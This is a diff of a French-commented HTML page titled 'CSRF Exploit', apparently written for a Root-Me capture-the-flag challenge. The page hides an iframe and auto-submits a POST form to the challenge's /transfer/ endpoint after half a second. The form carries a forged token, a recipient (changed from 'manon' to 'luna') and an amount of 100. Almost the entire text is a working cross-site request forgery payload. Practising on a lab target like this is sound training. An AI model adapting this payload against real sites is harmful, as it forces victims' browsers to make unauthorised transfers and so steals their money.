@@ -6,18 +6,20 @@
     <title>CSRF Exploit</title>
 </head>
 <body>
-    <h1>Patientez...</h1>
-    <p>Action en cours. Merci de patienter quelques instants.</p>
-    <!-- Utilisation d'une image pour forcer une requête POST -->
+    <h1>Veuillez patienter...</h1>
+    <p>Un transfert est en cours...</p>
+    <!-- Iframe cachée pour soumettre la requête POST -->
     <iframe style="display: none;" name="csrfFrame"></iframe>
     <form id="csrfForm" action="https://bankme-2.challenges.pro.root-me.org/transfer/" method="POST" target="csrfFrame">
-        <!-- Valeurs nécessaires pour la requête -->
-        <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6bWFub246MTAw">
-        <input type="hidden" name="recipient" value="manon">
+        <!-- Token CSRF -->
+        <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6bHVuYToxMDA%3D">
+        <!-- Destinataire du transfert -->
+        <input type="hidden" name="recipient" value="luna">
+        <!-- Montant du transfert -->
         <input type="hidden" name="amount" value="100">
     </form>
     <script>
-        // Attendre un court instant avant de soumettre le formulaire
+        // Soumission automatique du formulaire après un délai court
         setTimeout(() => {
             document.getElementById('csrfForm').submit();
         }, 500);
